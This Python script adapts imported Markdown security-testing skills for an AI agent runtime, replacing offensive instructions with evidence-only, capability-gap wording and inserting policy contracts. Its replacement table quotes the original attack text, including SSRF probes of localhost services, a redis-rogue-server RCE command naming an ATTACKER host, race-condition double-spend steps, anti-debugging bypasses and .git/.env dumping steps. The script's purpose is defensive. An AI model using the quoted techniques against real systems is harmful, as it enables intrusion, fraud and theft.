"""Adapt imported Markdown Skills to ZhiyuGo's bounded runtime contract."""

from __future__ import annotations

import argparse
import json
import re
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any

CONTRACT_START = "<!-- zhiyugo:contract:start -->"
CONTRACT_END = "<!-- zhiyugo:contract:end -->"
RESOURCE_START = "<!-- zhiyugo:resource:start -->"
RESOURCE_END = "<!-- zhiyugo:resource:end -->"
TOC_START = "<!-- zhiyugo:toc:start -->"
TOC_END = "<!-- zhiyugo:toc:end -->"
DETAIL_REFERENCE = "TECHNIQUE_REFERENCE.md"
MAX_MAIN_CHARS = 6_500

_CONTRACT = re.compile(
    rf"\n?{re.escape(CONTRACT_START)}.*?{re.escape(CONTRACT_END)}\n?",
    re.DOTALL,
)
_RESOURCE_NOTICE = re.compile(
    rf"\n?{re.escape(RESOURCE_START)}.*?{re.escape(RESOURCE_END)}\n?",
    re.DOTALL,
)
_TOC = re.compile(
    rf"\n?{re.escape(TOC_START)}.*?{re.escape(TOC_END)}\n?",
    re.DOTALL,
)
_CROSS_SKILL_LINK = re.compile(
    r"\[[^\]\r\n]+\]\(\.\./([a-z0-9](?:[a-z0-9-]{0,62}[a-z0-9])?)/SKILL\.md(?:#[^)]*)?\)",
    re.IGNORECASE,
)
_PLAIN_CROSS_SKILL = re.compile(
    r"\.\./([a-z0-9](?:[a-z0-9-]{0,62}[a-z0-9])?)/SKILL\.md",
    re.IGNORECASE,
)
_CROSS_RESOURCE_LINK = re.compile(
    r"\[([^\]\r\n]+)\]\(\.\./([a-z0-9](?:[a-z0-9-]{0,62}[a-z0-9])?)/"
    r"([^\s)]+\.md)(?:#[^)]*)?\)",
    re.IGNORECASE,
)
_ROUTE_VERB = re.compile(r"\bload (?=`[a-z0-9][a-z0-9-]*`)", re.IGNORECASE)
_LOCAL_RESOURCE_VERB = re.compile(
    r"\b(?:load|read) (?=\[[^\]\r\n]+\]\((?:\./)?[^/)]+\.md\))",
    re.IGNORECASE,
)
_LOCAL_RESOURCE_LINK = re.compile(
    r"\]\((?:\./)?([^/#?\s)]+\.md)(?:#[^)]*)?\)",
    re.IGNORECASE,
)
_BASE_MODELS = re.compile(r"\bbase models\b", re.IGNORECASE)
_LEGACY_REFERENCE_NOTICE = (
    "> ZhiyuGo reference material only. Examples in this file are not Tool Registry actions, "
    "authorization, or evidence."
)
_PROJECT_REWRITES = (
    (
        "Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree "
        "on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 "
        "downgrade.",
        "Applicability signal: route to this Skill before a Run when supplied evidence suggests "
        "that a CDN/reverse proxy and origin disagree on request boundaries, including abnormal "
        "H2-to-H1 concatenation. The active Run cannot load this Skill dynamically.",
    ),
    (
        "- `prototype-pollution` — **LOAD FIRST** for PP fundamentals, merge-sink detection, "
        "basic probes",
        "- `prototype-pollution` — prerequisite route for PP fundamentals, merge-sink detection, "
        "and basic probes; resolve this route before the Run",
    ),
    (
        "### Double-Spend / Double-Redeem\n```bash\n# Send same request simultaneously "
        '(~millisecond apart):\n# Use Burp Repeater "Send to Group" or Race Conditions tool:\n\n'
        "POST /api/use-coupon    ← send 20 parallel requests\n"
        "POST /api/redeem-gift   ← same coupon code, parallel\n"
        "POST /api/withdraw-funds ← same balance, parallel\n\n"
        "# If check and update are non-atomic:\n"
        "# Thread 1: check(balance >= 100) → TRUE\n"
        "# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)\n"
        "# Thread 1: balance -= 100\n"
        "# Thread 2: balance -= 100 → BOTH succeed → double-spend\n"
        "```\n\n### Race Condition Test with Burp Suite\n```\n1. Capture request\n"
        "2. Send to Repeater → duplicate 20+ times\n"
        '3. "Send group in parallel" (Burp 2023+)\n'
        "4. Check: did any duplicate succeed?\n```",
        "### Double-spend / double-redeem evidence model\n\n"
        "A credible race-condition candidate requires a single-request baseline, synchronized "
        "request timestamps from an authorized external harness, every response, state before "
        "and after the batch, and a sequential negative control. A duplicate success is only a "
        "finding when the cited state evidence proves the invariant was violated.\n\n"
        "The current Tool Registry cannot issue synchronized state-changing requests. Burp "
        "concurrency features and custom harnesses are external analyst references; report a "
        "capability gap instead of claiming this test ran.",
    ),
    (
        "Check Burp Collaborator for incoming HTTP request with the reset token.",
        "Only supplied out-of-band callback evidence can support token leakage here. The current "
        "runtime cannot query Burp Collaborator; without a callback artifact and Evidence ID, "
        "record a capability gap rather than a finding.",
    ),
    (
        "### How to Find Hidden Admin Endpoints\n1. Read JS bundles — admin routes often "
        'exposed in frontend code\n2. Look at API docs (Swagger/OpenAPI) for "admin", '
        '"internal", "privileged" tags\n3. Enumerate `/api/v1/admin/**`, '
        '`/api/v1/manage/**`, `/api/v1/internal/**`\n4. Burp "Discover Content" on API '
        "base path\n5. Compare regular user docs vs admin section docs if available",
        "### Hidden admin endpoint evidence\n"
        "1. Search supplied JavaScript or API docs for admin/internal route markers.\n"
        "2. Path prefixes are hints, never permission to enumerate.\n"
        "3. Compare user/admin docs only when both are authorized.\n"
        "4. Burp or crawler discovery is a current capability gap.",
    ),
    (
        "**Verification**: open a fresh page without fragment and check in console whether test "
        "keys remain on `Object.prototype`; account for extension and DevTools interference.",
        "**Verification evidence**: require a supplied fresh-page capture showing whether test "
        "keys remain on `Object.prototype`, plus a clean-profile negative control. The current "
        "runtime cannot open a page or inspect a browser console, so otherwise report a "
        "capability gap.",
    ),
    (
        "**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern "
        "(see §5) as the practical stand-in for synchronized release.",
        "**Capability gap**: Burp/Turbo Intruder and concurrency harnesses are external. Require "
        "supplied timestamped evidence; ZhiyuGo cannot run this test.",
    ),
    (
        "## 2. BASIC CONFIRMATION METHODOLOGY\n\n```\n"
        "Step 1: Supply your Burp Collaborator / interact.sh URL\n"
        "        → Check server initiates outbound connection (full SSRF confirmed)\n\n"
        "Step 2: If no callback → test time-based (open port = fast, closed = slow/reset):\n"
        "        Compare response time for:\n"
        "        http://192.168.1.1:22   (likely open → fast)\n"
        "        http://192.168.1.1:9999 (likely closed → slow/timeout)\n\n"
        "Step 3: Try accessing localhost services:\n"
        "        http://127.0.0.1:8080\n"
        "        http://127.0.0.1:22\n"
        "        http://127.0.0.1:6379  (Redis)\n"
        "        http://127.0.0.1:9200  (Elasticsearch)\n"
        "        http://127.0.0.1:5984  (CouchDB)\n"
        "        http://127.0.0.1:2375  (Docker daemon — critical!)\n"
        "        http://127.0.0.1:4840  (internal admin)\n```",
        "## 2. CONFIRMATION EVIDENCE MODEL\n\n"
        "- Preserve the exact authorized input, a stable baseline response, and the response to "
        "one changed variable as separate Evidence records.\n"
        "- Treat an out-of-band callback as evidence only when a supplied callback artifact "
        "correlates to the request by token and time. The runtime has no Collaborator or "
        "interact.sh client.\n"
        "- Timing claims require repeated measurements, controls, and error bounds; one slow "
        "response is not proof of an open internal port.\n"
        "- Never infer permission to contact localhost, private ranges, or cloud metadata. Every "
        "destination must already be explicit in `TaskSpec` scope and accepted by execution "
        "policy.\n"
        "- If callback collection, state-changing requests, or an in-scope destination is "
        "unavailable, return a capability or scope gap and keep the result as a hypothesis.",
    ),
    (
        "**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; "
        "for deeper API testing, align authn/authz models through `api-sec`.",
        "**Routing note**: when supplied HTTP evidence contains `101` and `Upgrade: websocket`, "
        "route the authentication and authorization model through `api-sec` before the Run. "
        "Burp and browser DevTools are not current runtime capabilities.",
    ),
    (
        "## 3. TESTING WITH TOOLS\n\n### wsrepl\n\n```bash\n"
        "pip install wsrepl\nwsrepl -u wss://target.example.com/ws -P auth_plugin.py\n"
        "```\n\nUse a **plugin** to reproduce browser cookies, headers, or token refresh during "
        "the WebSocket lifecycle.\n\n### ws-harness (bridge to HTTP for other tools)\n\n"
        '```bash\npython ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt\n'
        "```\n\nExample downstream use with SQL injection tooling over the bridged HTTP surface "
        "(adjust URL to local listener):\n\n```bash\n"
        'sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch\n'
        "```\n\n### Burp Suite ecosystem\n\n"
        "- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.\n"
        "- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.",
        "## 3. EXTERNAL TOOLING BOUNDARY\n\n"
        "The current Tool Registry has no WebSocket client, browser, proxy extension, package "
        "installer, arbitrary Python, or shell capability. `wsrepl`, `ws-harness`, sqlmap, and "
        "Burp extensions are external analyst references only. Analyze supplied handshake and "
        "frame captures with bounded file tools; otherwise record the missing WebSocket "
        "capability.",
    ),
    (
        "3. **Session binding** — Reconnect with **another user\N{RIGHT SINGLE QUOTATION MARK}s** "
        "cookie jar in Burp; compare "
        "subscription topics and data leakage.\n"
        "4. **CSWSH** — Load a **local HTML** page that connects to the target with victim "
        "session active; verify server rejects wrong **Origin** or uses non-cookie secret.\n"
        "5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as "
        "HTTP API testing.",
        "3. **Session binding** — Compare supplied captures from two explicitly authorized "
        "accounts; the runtime cannot reconnect with another user's cookie jar.\n"
        "4. **CSWSH** — Require supplied browser evidence and an Origin negative control; the "
        "runtime cannot load a local HTML page.\n"
        "5. **Message semantics** — Analyze supplied JSON/text frames. Active WebSocket fuzzing "
        "is a capability gap.",
    ),
    (
        "**Bypass**: Set hardware breakpoint after second `rdtsc`, modify `eax` to pass the "
        "comparison. Or use Frida to replace the timing function.",
        "**External lab reference**: a debugger can alter the post-`rdtsc` value, while Frida "
        "can instrument the timing function. The current runtime provides neither capability; "
        "only analyze supplied traces and patched-artifact evidence.",
    ),
    (
        "When a debugger is attached, `SIGTRAP` is consumed by the debugger rather than delivered "
        "to the handler. **Bypass**: In GDB, use `handle SIGTRAP nostop pass` to forward the "
        "signal.",
        "When a debugger is attached, `SIGTRAP` may be consumed instead of reaching the handler. "
        "**External lab reference**: GDB signal forwarding can test this hypothesis, but the "
        "current runtime cannot control a debugger; require supplied trace evidence.",
    ),
    (
        "Run these immediately after landing a shell:",
        "When an explicitly isolated lab supplies shell-enumeration output, inspect these "
        "artifact classes. The current runtime does not obtain or control a shell; the commands "
        "below are reference syntax only:",
    ),
    (
        "### Master-Slave Replication RCE\n\n"
        "Use `redis-rogue-server` to exploit master-slave replication for loading malicious "
        "`.so` module:\n\n```bash\n"
        "python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER\n"
        "# Loads module via SLAVEOF → MODULE LOAD → system.exec\n```",
        "### Master-replica module-loading risk\n\n"
        "This lab-only branch requires an external replication harness, a controlled malicious "
        "module, and an isolated target. None is a current ZhiyuGo capability. Treat the "
        "technique as reference material and require supplied module, configuration, and result "
        "evidence; otherwise report the capability gap.",
    ),
    (
        "## 5. DECISION TREE\n\n"
        "1. **Probe `/.git/HEAD`** → `ref: refs/heads/` pattern? → run **git-dumper / GitTools / "
        "GitHacker**; review `config` and `logs/HEAD` for secrets.\n"
        "2. **Else probe `/.svn/wc.db` or `entries`** → success? → **svn-extractor** or manual "
        "`wc.db` + pristine recovery.\n"
        "3. **Else probe `/.hg/requires`** → success? → **mercurial dumper**.\n"
        "4. **Else probe `/.bzr/README`** → Bazaar tooling or manual path walk.\n"
        "5. **Parallel**: fetch **`/.DS_Store`**, **`/.env`**, common **backup extensions** on app "
        "root and parent paths.\n"
        "6. **Interpret status codes**: **403 on directory** + **200 on specific files** → treat "
        "as **high priority** for file-by-file extraction.",
        "## 5. EVIDENCE DECISION TREE\n\n"
        "1. If bounded GET evidence for `/.git/HEAD` contains a ref marker, record a repository "
        "exposure candidate and inspect only supplied `config` or `logs/HEAD` artifacts.\n"
        "2. Otherwise classify supplied `.svn/wc.db`, `.hg/requires`, or `.bzr/README` evidence "
        "by repository type.\n"
        "3. Treat git-dumper, GitTools, GitHacker, svn-extractor, Mercurial dumpers, and Bazaar "
        "tools as external references; the current runtime cannot execute them.\n"
        "4. Request only exact, in-scope paths through bounded `http.request`; do not infer parent "
        "scope or bulk-enumeration permission.\n"
        "5. Interpret a directory `403` plus a specific-file `200` as a candidate only. Preserve "
        "both responses and require file-content evidence before reporting exposure.",
    ),
    (
        "**Note**: coordinate with recon skills—set scope and request rate first, then run "
        "targeted VCS/backup validation.",
        "**Note**: resolve recon routes before the Run, set scope and request rate, and then "
        "evaluate only bounded VCS/backup evidence supported by current capabilities.",
    ),
    (
        "### Token Tied to Session but Not to User\n```\n"
        "Step 1: Log in as UserA → obtain valid CSRF token\n"
        "Step 2: Log in as UserB in other browser → obtain UserB CSRF token  \n"
        "Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)\n"
        "→ If server validates token exists but doesn't check if it belongs to the session → "
        "bypass\n```",
        "### Token tied to session but not to user\n\n"
        "This hypothesis requires supplied captures from two explicitly authorized accounts, "
        "including each session/token binding and a cross-session negative control. ZhiyuGo "
        "cannot operate browser sessions or issue the state-changing request; without those "
        "Evidence IDs, record a capability gap.",
    ),
    (
        '**Bypass**: Hook `fopen("/proc/self/maps")` to return a filtered version, or rename '
        "Frida's agent library.",
        "**External lab reference**: API hooking or an instrumented library can test this check. "
        "ZhiyuGo cannot hook functions or alter a Frida agent; require supplied trace and "
        "patched-artifact evidence.",
    ),
    (
        "**Bypass**: Mount a FUSE filesystem over `/proc/self`, or `LD_PRELOAD` hook `fopen`/"
        "`fread` to filter `TracerPid` to 0.",
        "**External lab reference**: FUSE or `LD_PRELOAD` interposition can test this branch. "
        "ZhiyuGo cannot mount filesystems or hook functions; require supplied trace evidence.",
    ),
    (
        "**Bypass**: Unset suspicious env vars before launch, or hook `getenv()`.",
        "**External lab reference**: environment normalization or `getenv()` instrumentation can "
        "test this branch. ZhiyuGo cannot alter a process environment or hook functions; require "
        "supplied trace evidence.",
    ),
    (
        "**First moves (conceptual)**:\n\n"
        "1. Capture the **state-changing** request in a proxy.\n"
        "2. Send **20\N{EN DASH}100** copies **as simultaneously as your tooling allows**.\n"
        "3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent "
        "final state**.",
        "**Evidence prerequisites**:\n\n"
        "1. Preserve the supplied baseline and final state.\n"
        "2. Require an external harness's timestamped batch and all responses.\n"
        "3. Cite each duplicate success or inconsistency.\n\n"
        "ZhiyuGo cannot capture or send concurrent requests.",
    ),
    (
        "Send the **same** authenticated request many times in parallel:",
        "Require supplied parallel-request evidence; ZhiyuGo cannot send the batch:",
    ),
    (
        "1. Start two parallel pipelines from the same session/item.\n"
        "2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or "
        "abandoned.",
        "1. Require supplied traces for two authorized pipelines.\n"
        "2. Check whether confirmation preceded matching payment; generation is unavailable.",
    ),
)


@dataclass(frozen=True, slots=True)
class PolicyEntry:
    name: str
    enabled: bool
    role: str
    risk_class: str
    resource_loading: str


def _parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--root",
        type=Path,
        default=Path(__file__).resolve().parents[1] / "skills",
        help="Skill catalog root (default: repository skills directory)",
    )
    parser.add_argument(
        "--check",
        action="store_true",
        help="report files that still need adaptation without writing them",
    )
    return parser.parse_args()


def _load_policy(root: Path) -> tuple[dict[str, PolicyEntry], frozenset[str]]:
    raw = json.loads((root / "policy.json").read_text(encoding="utf-8"))
    if not isinstance(raw, dict) or not isinstance(raw.get("groups"), list):
        raise ValueError("policy.json must contain a groups list")
    entries: dict[str, PolicyEntry] = {}
    for group in raw["groups"]:
        if not isinstance(group, dict) or not isinstance(group.get("skills"), list):
            raise ValueError("every policy group must contain a skills list")
        for value in group["skills"]:
            if not isinstance(value, str) or value in entries:
                raise ValueError(f"invalid or duplicate policy skill {value!r}")
            entries[value] = PolicyEntry(
                name=value,
                enabled=_required_bool(group, "enabled"),
                role=_required_string(group, "role"),
                risk_class=_required_string(group, "risk_class"),
                resource_loading=_required_string(group, "resource_loading"),
            )
    excluded_raw = raw.get("excluded")
    if not isinstance(excluded_raw, list):
        raise ValueError("policy.json must contain an excluded list")
    excluded = frozenset(
        _required_string(item, "skill") for item in excluded_raw if isinstance(item, dict)
    )
    return entries, excluded


def _required_string(value: dict[str, Any], key: str) -> str:
    item = value.get(key)
    if not isinstance(item, str) or not item.strip():
        raise ValueError(f"{key} must be a non-empty string")
    return item.strip()


def _required_bool(value: dict[str, Any], key: str) -> bool:
    item = value.get(key)
    if not isinstance(item, bool):
        raise ValueError(f"{key} must be boolean")
    return item


def _split_frontmatter(text: str, path: Path) -> tuple[str, str]:
    normalized = text.replace("\r\n", "\n").replace("\r", "\n")
    lines = normalized.splitlines(keepends=True)
    if not lines or lines[0].strip() != "---":
        raise ValueError(f"{path} has no YAML frontmatter")
    closing = next(
        (position for position, line in enumerate(lines[1:], start=1) if line.strip() == "---"),
        None,
    )
    if closing is None:
        raise ValueError(f"{path} has unterminated YAML frontmatter")
    frontmatter = "".join(lines[: closing + 1]).rstrip() + "\n\n"
    body = "".join(lines[closing + 1 :]).lstrip("\n")
    return frontmatter, body


def _clean_imported_semantics(text: str) -> str:
    text = text.replace("**AI LOAD INSTRUCTION**", "**Technical reference scope**")
    text = _BASE_MODELS.sub("baseline analyses", text)
    text = re.sub(r"\bcross-load\b", "route to", text, flags=re.IGNORECASE)
    text = re.sub(r"\bconsider loading\b", "consider routing to", text, flags=re.IGNORECASE)
    text = re.sub(
        r"(?im)^(##\s+(?:\d+\.\s*)?)WHEN TO LOAD THIS SKILL\s*$",
        r"\1WHEN THIS SKILL APPLIES",
        text,
    )
    text = re.sub(
        r"(?im)^Load when:\s*$",
        "Use this workflow when:",
        text,
    )
    text = re.sub(
        r"(?im)^Also load:\s*$",
        "Related catalog routes:",
        text,
    )
    text = re.sub(
        r"(?im)^(Use this file[^\n]*\.) Also load:\s*$",
        r"\1 Related catalog routes:",
        text,
    )
    text = re.sub(
        r"(?im)^Before [^\n:]+, (?:you )?can first load:\s*$",
        "Before deeper analysis, consider these catalog routes:",
        text,
    )
    text = re.sub(
        r"(?im)^([^\n]+), also load:\s*$",
        r"\1, route to:",
        text,
    )
    text = re.sub(
        r"\bload methodology from (?=`[a-z0-9][a-z0-9-]*`)",
        "route through ",
        text,
        flags=re.IGNORECASE,
    )
    text = _CROSS_SKILL_LINK.sub(lambda match: f"`{match.group(1).casefold()}`", text)
    text = _PLAIN_CROSS_SKILL.sub(lambda match: f"`{match.group(1).casefold()}`", text)
    text = _CROSS_RESOURCE_LINK.sub(
        lambda match: (
            f"{match.group(1)} reference in the canonical `{match.group(2).casefold()}` Skill"
        ),
        text,
    )

    def route_verb(match: re.Match[str]) -> str:
        return "Route to " if match.group(0)[0].isupper() else "route to "

    text = _ROUTE_VERB.sub(route_verb, text)

    def inspect_verb(match: re.Match[str]) -> str:
        return "Inspect " if match.group(0)[0].isupper() else "inspect "

    text = _LOCAL_RESOURCE_VERB.sub(inspect_verb, text)
    text = re.sub(
        r"\bload the companion\b",
        "inspect the companion",
        text,
        flags=re.IGNORECASE,
    )
    for old, new in _PROJECT_REWRITES:
        text = text.replace(old, new)
    return text


def _contract(entry: PolicyEntry) -> str:
    default = "enabled" if entry.enabled else "disabled"
    header = (
        f"{CONTRACT_START}\n"
        "## ZhiyuGo workflow\n\n"
        f"Catalog mirror: `role={entry.role}`, `risk={entry.risk_class}`, "
        f"`default={default}`. Trusted `policy.json` remains authoritative.\n\n"
    )
    if entry.role == "router":
        guidance = (
            "- Return routing decisions rather than payloads: list at most two canonical Skill "
            "names, the observation supporting each route, and the next evidence needed.\n"
            "- Treat sibling Skill names as catalog hints only. Do not read sibling paths or "
            "claim that another Skill was loaded during this Run.\n"
            "- Report an exact candidate as policy-filtered when it is disabled or lab-only; "
            "do not reproduce its high-risk procedure in the router.\n"
            "- Leave the route unresolved when the available evidence does not distinguish the "
            "candidate branches.\n"
        )
    elif entry.role == "quality_gate":
        guidance = (
            "- Assess existing findings and evidence only; do not request a new tool action.\n"
            "- Require the affected subject, authorization boundary, positive and negative "
            "controls, concrete security effect, and tool-produced evidence IDs.\n"
            "- Return exactly one verdict: `verified`, `needs-more-evidence`, `non-reportable`, "
            "or `out-of-scope`.\n"
            "- Do not strengthen impact language beyond the cited evidence.\n"
        )
    elif entry.role == "orchestrator":
        lab_boundary = (
            " Keep every stage inside an isolated lab or CTF environment."
            if entry.risk_class == "lab_only"
            else ""
        )
        guidance = (
            "- Produce an evidence-gated stage graph for the Planner; do not claim to start a "
            f"sub-agent, browser, MCP server, shell, or sibling Skill.{lab_boundary}\n"
            "- Give each stage an entry condition, one work product, a supported abstract "
            "capability or explicit capability gap, and an exit criterion.\n"
            "- Use canonical Skill names only as route hints resolved before a Run.\n"
            "- Stop planning when scope, required input, or a supported capability is missing.\n"
        )
    elif entry.risk_class == "passive":
        guidance = (
            "- Start from supplied artifacts or existing tool-produced evidence; never treat an "
            "example, command block, or expected result below as an observation.\n"
            "- Record facts separately from inferences, cite evidence IDs and content hashes when "
            "available, and state uncertainty and failed branches.\n"
            "- Treat external utilities and command lines as analyst reference material. If the "
            "Tool Registry lacks the capability, report a capability gap instead of simulating it.\n"
            "- Conclude only when the task success criteria are supported by reproducible evidence.\n"
        )
    elif entry.risk_class == "active" and entry.enabled:
        guidance = (
            "- Restrict activity to the exact TaskSpec scope. Use only bounded registry actions "
            "accepted by execution policy; this project Skill does not permit exploitation.\n"
            "- Preserve baseline and test ToolResults as Evidence, including errors and negative "
            "observations, before drawing a conclusion.\n"
            "- Treat command examples as reference syntax, not as shell access. Stop when a "
            "required capability or explicit target is absent.\n"
            "- Complete only after every success criterion is assessed from cited evidence.\n"
        )
    elif entry.risk_class == "active":
        guidance = (
            "- Keep this default-disabled workflow in planning and reference mode. Catalog body "
            "inspection does not authorize network interaction or state changes.\n"
            "- Define an exact in-scope subject, stable baseline, one-variable test, negative "
            "control, expected evidence, and stop condition before any future activation.\n"
            "- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, "
            "and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or "
            "exploit operations.\n"
            "- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.\n"
        )
    else:
        guidance = (
            "- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. "
            "Inspection flags do not authorize actions against a live or non-consenting system.\n"
            "- Confirm the supplied artifact, environment, primitive, mitigations, and expected "
            "lab success marker before choosing a technique.\n"
            "- Treat shell, exploit, credential, persistence, evasion, and lateral-movement "
            "examples as reference data; the current Tool Registry does not provide them.\n"
            "- Record artifact hashes, prerequisite evidence, observed output, and the exact exit "
            "condition; otherwise return the missing prerequisite or capability.\n"
        )
    return f"{header}{guidance}{CONTRACT_END}"


def _insert_after_h1(body: str, block: str, path: Path) -> str:
    match = re.search(r"(?m)^# [^\n]+$", body)
    if match is None:
        raise ValueError(f"{path} has no level-one Markdown heading")
    return f"{body[: match.end()].rstrip()}\n\n{block}\n\n{body[match.end() :].lstrip()}"


def _headings(text: str, *, level: int = 2) -> list[tuple[int, str]]:
    results: list[tuple[int, str]] = []
    in_fence = False
    offset = 0
    prefix = "#" * level + " "
    for line in text.splitlines(keepends=True):
        stripped = line.lstrip()
        if stripped.startswith(("```", "~~~")):
            in_fence = not in_fence
        elif not in_fence and line.startswith(prefix):
            results.append((offset, line[len(prefix) :].strip()))
        offset += len(line)
    return results


def _reference_summary(headings: list[str]) -> str:
    shown = headings[:8]
    bullets = "\n".join(f"- {heading}" for heading in shown)
    if len(headings) > len(shown):
        bullets += f"\n- … plus {len(headings) - len(shown)} additional sections"
    return (
        "## Detailed reference\n\n"
        f"Inspect [{DETAIL_REFERENCE}]({DETAIL_REFERENCE}) through explicit catalog resource "
        "tooling only when one of these advanced branches is required; the current Run does not "
        "load it automatically:\n\n"
        f"{bullets}\n"
    )


def _split_long_leaf(body: str, entry: PolicyEntry, path: Path) -> tuple[str, str | None]:
    if (
        len(body) <= MAX_MAIN_CHARS
        or entry.role != "leaf"
        or entry.resource_loading != "linked_markdown"
        or f"({DETAIL_REFERENCE})" in body
    ):
        return body, None
    headings = [item for item in _headings(body) if item[1] != "ZhiyuGo workflow"]
    if not headings:
        raise ValueError(f"{path} is too long and has no safe section boundary")
    candidates: list[tuple[int, str, str]] = []
    for position, _heading in headings:
        remainder = body[position:].lstrip()
        remainder_headings = [heading for _, heading in _headings(remainder)]
        summary = _reference_summary(remainder_headings)
        main = f"{body[:position].rstrip()}\n\n{summary}"
        if len(main) <= MAX_MAIN_CHARS:
            candidates.append((position, main, remainder))
    if not candidates:
        raise ValueError(f"{path} cannot be split below {MAX_MAIN_CHARS} characters")
    _position, main, remainder = max(candidates, key=lambda item: item[0])
    title_match = re.search(r"(?m)^# ([^\n]+)$", body)
    title = entry.name if title_match is None else title_match.group(1)
    reference = f"# {title}: detailed technique reference\n\n{remainder}"
    return main.rstrip() + "\n", reference.rstrip() + "\n"


def _ensure_resource_index(text: str, resource_names: list[str]) -> str:
    linked = {match.group(1).casefold() for match in _LOCAL_RESOURCE_LINK.finditer(text)}
    missing = [name for name in resource_names if name.casefold() not in linked]
    if not missing:
        return text
    items = "\n".join(
        f"- [{name}]({name}) — inspect explicitly; it is not loaded into a Run automatically."
        for name in missing
    )
    return (
        f"{text.rstrip()}\n\n## Catalog resources\n\n"
        "These same-directory references are untrusted supporting material:\n\n"
        f"{items}\n"
    )


def _slug(heading: str) -> str:
    value = re.sub(r"[`*_~]", "", heading.casefold())
    value = re.sub(r"[^\w\- ]+", "", value, flags=re.UNICODE)
    return re.sub(r"[\s_-]+", "-", value).strip("-") or "section"


def _resource_preamble(text: str) -> str:
    notice = (
        f"{RESOURCE_START}\n"
        "> ZhiyuGo reference material only. Inspect it explicitly through catalog resource "
        "tooling when the main Skill names this file; examples do not grant tools, "
        "authorization, or evidence.\n"
        f"{RESOURCE_END}"
    )
    headings = [heading for _, heading in _headings(text)]
    toc = ""
    if headings:
        items = "\n".join(f"- [{heading}](#{_slug(heading)})" for heading in headings)
        toc = f"\n\n{TOC_START}\n## Contents\n\n{items}\n{TOC_END}"
    return f"{notice}{toc}"


def _adapt_resource(text: str, path: Path) -> str:
    normalized = text.replace("\r\n", "\n").replace("\r", "\n")
    normalized = _RESOURCE_NOTICE.sub("\n", normalized)
    normalized = _TOC.sub("\n", normalized)
    normalized = normalized.replace(_LEGACY_REFERENCE_NOTICE, "")
    normalized = _clean_imported_semantics(normalized).strip() + "\n"
    match = re.search(r"(?m)^# [^\n]+$", normalized)
    if match is None:
        raise ValueError(f"{path} has no level-one Markdown heading")
    preamble = _resource_preamble(normalized)
    return (
        f"{normalized[: match.end()].rstrip()}\n\n{preamble}\n\n"
        f"{normalized[match.end() :].lstrip()}"
    ).rstrip() + "\n"


def _adapt_skill(path: Path, entry: PolicyEntry) -> tuple[str, str | None]:
    frontmatter, body = _split_frontmatter(path.read_text(encoding="utf-8"), path)
    body = _CONTRACT.sub("\n", body)
    body = _clean_imported_semantics(body).strip() + "\n"
    body = _insert_after_h1(body, _contract(entry), path)
    body, reference = _split_long_leaf(body, entry, path)
    return f"{frontmatter}{body.rstrip()}\n", reference


def main() -> int:
    args = _parse_arguments()
    root = args.root.resolve()
    entries, excluded = _load_policy(root)
    changed: list[str] = []
    generated: list[str] = []
    for name in sorted(entries):
        directory = root / name
        path = directory / "SKILL.md"
        if not path.is_file() or path.is_symlink() or directory.is_symlink():
            raise ValueError(f"cataloged Skill {name!r} has no safe SKILL.md")
        adapted, reference = _adapt_skill(path, entries[name])
        existing_resources = sorted(
            resource_path.name
            for resource_path in directory.glob("*.md")
            if resource_path.name != "SKILL.md"
        )
        adapted = _ensure_resource_index(adapted, existing_resources)
        _frontmatter, adapted_body = _split_frontmatter(adapted, path)
        entry = entries[name]
        if (
            entry.role == "leaf"
            and entry.resource_loading == "linked_markdown"
            and len(adapted_body) > MAX_MAIN_CHARS
        ):
            raise ValueError(f"{path} exceeds the {MAX_MAIN_CHARS}-character main-body budget")
        if adapted != path.read_text(encoding="utf-8"):
            changed.append(path.relative_to(root).as_posix())
            if not args.check:
                path.write_text(adapted, encoding="utf-8", newline="\n")
        reference_path = directory / DETAIL_REFERENCE
        if reference is not None:
            if reference_path.exists():
                raise ValueError(f"refusing to replace existing {reference_path}")
            generated.append(reference_path.relative_to(root).as_posix())
            if not args.check:
                reference_path.write_text(reference, encoding="utf-8", newline="\n")

    for name in sorted(entries):
        directory = root / name
        for resource_path in sorted(directory.glob("*.md")):
            if resource_path.name == "SKILL.md":
                continue
            original = resource_path.read_text(encoding="utf-8")
            adapted = _adapt_resource(original, resource_path)
            if adapted != original:
                relative = resource_path.relative_to(root).as_posix()
                if relative not in generated:
                    changed.append(relative)
                if not args.check:
                    resource_path.write_text(adapted, encoding="utf-8", newline="\n")

    unknown = sorted(
        directory.name
        for directory in root.iterdir()
        if directory.is_dir() and directory.name not in entries and directory.name not in excluded
    )
    if unknown:
        raise ValueError(f"unclassified Skill directories: {', '.join(unknown)}")
    print(
        json.dumps(
            {
                "cataloged": len(entries),
                "changed": sorted(set(changed)),
                "generated": sorted(generated),
                "mode": "check" if args.check else "apply",
            },
            ensure_ascii=False,
            indent=2,
            sort_keys=True,
        )
    )
    return 1 if args.check and (changed or generated) else 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, ValueError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc)}, ensure_ascii=False), file=sys.stderr)
        raise SystemExit(2) from exc
